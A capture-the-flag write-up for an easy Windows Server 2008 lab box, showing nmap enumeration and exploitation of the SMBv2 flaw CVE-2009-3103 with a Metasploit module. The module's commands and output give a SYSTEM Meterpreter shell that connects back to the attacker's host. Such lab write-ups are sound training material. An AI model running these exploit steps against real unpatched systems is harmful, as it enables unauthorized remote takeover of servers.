---
title: "Internal - Writeup"
linkTitle: "Internal"
weight: 3
featured: true
platform: "PG"
name: "Internal"
os: "Windows"
difficulty: "Easy"
release: "28 Jun 2026"
ip: "192.168.53.40"
# Drop a real avatar at static/img/pg/internal.png and uncomment:
# avatar: "/img/pg/internal.png"
tags: ["windows", "smb", "cve-2009-3103", "ms09-050", "metasploit", "system-shell"]
description: "Easy Windows box. An ancient SMBv2 negotiation flaw on Windows Server 2008 goes straight to a SYSTEM shell through a single Metasploit module."
---

{{< htb name="Internal" os="Windows" difficulty="Easy" release="28 Jun 2026" ip="192.168.53.40" platform="PG" >}}

## Reconnaissance

Start with a quick default scan by nmap.

```
(root㉿kali)# nmap 192.168.53.40
```

```
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
```

DNS plus a full SMB stack points at a domain controller or an internal server. Follow up with service detection and every SMB script nmap has.

```
(root㉿kali)# nmap 192.168.53.40 -p53,135,139,445,3389,49152,49153,49154,49155 -sCV --script smb-*
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1
Host script results:
| smb-os-discovery:
|   Computer name: internal
|_  Workgroup: WORKGROUP
```

## Enumeration

The SMB script sweep does the real work here. Buried in the output is a confirmed vulnerability.

```
| smb-vuln-cve2009-3103:
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     Array index error in the SMBv2 protocol implementation in srv2.sys,
|     triggered via an & character in a Process ID High header field in a
|     NEGOTIATE PROTOCOL REQUEST packet.
```

An unauthenticated remote code execution bug in the SMBv2 negotiation handler itself, no credentials or share access needed to trigger it.

## Initial Foothold

Metasploit has a dedicated module for this CVE.

```
(root㉿kali)# msfconsole -q
msf6 > search CVE-2009-3103
msf6 > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
msf6 exploit(ms09_050_smb2_negotiate_func_index) > set RHOSTS 192.168.53.40
msf6 exploit(ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.49.53
msf6 exploit(ms09_050_smb2_negotiate_func_index) > exploit
```

```
[*] 192.168.53.40:445 - Sending the exploit packet (951 bytes) ...
[*] 192.168.53.40:445 - Waiting up to 300 seconds for exploit to trigger ...
[*] Sending stage (190534 bytes) to 192.168.53.40
[*] Meterpreter session 1 opened (192.168.49.53:4411 -> 192.168.53.40:49159)
```

The malformed negotiate packet crashes and hijacks `srv2.sys` directly in kernel context. The session comes back already at the top.

```
meterpreter > getuid
```

```
Server username: NT AUTHORITY\SYSTEM
```

## Privilege Escalation

None needed. The kernel-level negotiation bug hands SYSTEM immediately on connect. Grab the flag straight from the Administrator desktop.

```
meterpreter > cat Users\\Administrator\\Desktop\\proof.txt
```

```
3c2b0f7a66c15013a0d92fd14a6f3baa
```

## Lessons learned

- Let the nmap script sweep do the heavy lifting before reaching for manual enumeration. `--script smb-*` surfaced a fully weaponized CVE with a working Metasploit module in one pass, no share hunting or credential guessing required.
- An old OS build (Server 2008, no patches) is a search query, not a puzzle. Once the exact version shows up in `smb-os-discovery`, check it against known CVEs before trying anything else.
- Kernel-level vulnerabilities skip the privilege ladder entirely. When the bug lives in a driver like `srv2.sys` rather than a user-mode service, there's often no separate privesc step at all, recognize that early instead of hunting for one that isn't there.
